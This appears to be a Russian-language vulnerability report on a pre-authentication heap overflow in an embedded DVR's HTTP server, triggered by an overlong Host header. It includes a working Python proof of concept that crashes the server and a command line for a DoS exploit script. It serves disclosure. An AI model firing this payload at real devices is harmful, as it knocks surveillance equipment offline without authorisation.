# [HH] HTTP Host Header Heap Overflow

**CWE-122** · **CVSS 7.5 High** · **Pre-auth** · **Remote**

---

## Краткое описание

HTTP-сервер на порту 80 переполняет heap-буфер при обработке заголовка `Host` длиной ≥ 256 байт. Устройство «Embedded Net DVR» (jQuery 1.7.1, realm `DVRDVS`) содержит отдельный HTTP-стек с той же классом ошибок, что и RTSP-парсер.

---

## Технические детали

### Уязвимое поле

```http
GET / HTTP/1.1
Host: <OVERFLOW_HERE — 260+ байт>
```

### Механизм

HTTP-парсер копирует значение `Host` в heap-буфер фиксированного размера (~255 байт). При длине ≥ 256 — heap corruption.

### Нестабильный триггер

Порог нестабилен: ~65% при 255–260 байтах. Вероятно, heap layout зависит от предыдущих запросов и состояния памяти.

| Длина Host | Триггер | Recovery |
|-----------|---------|----------|
| < 254 байта | Нет краша | — |
| 255–260 байт | ~65% | ~5–15 сек |
| 300+ байт | ~90% | ~5–15 сек |

---

## Доказательство (PoC)

```python
import socket

TARGET = "█████████████"
host = b'A' * 260
req = (b"GET / HTTP/1.1\r\n"
       b"Host: " + host + b"\r\n"
       b"Connection: close\r\n\r\n")

s = socket.socket(); s.settimeout(6)
s.connect((TARGET, 80)); s.sendall(req)
# При триггере: нет ответа → HTTP-сервер упал
```

---

## Отличие от известных CVE

- **CVE-2015-4407/4408/4409** — Hikvision IP cameras, требуют **аутентификации**, другой класс устройств
- Наш [HH] — **DVR**, **pre-auth**, **другой HTTP стек**
- Нет публичного CVE для `Host` overflow на Hikvision DVR

---

## CVSS v3.1

```
AV:N / AC:L / PR:N / UI:N / S:U / C:N / I:N / A:H  =  7.5 High
```

---

## Эксплойт

```bash
python3 exploits/crashbandicoot.py -t █████████████ --mode dos-http
```


---

*Co-authored with [Claude](https://claude.ai) (Anthropic)*
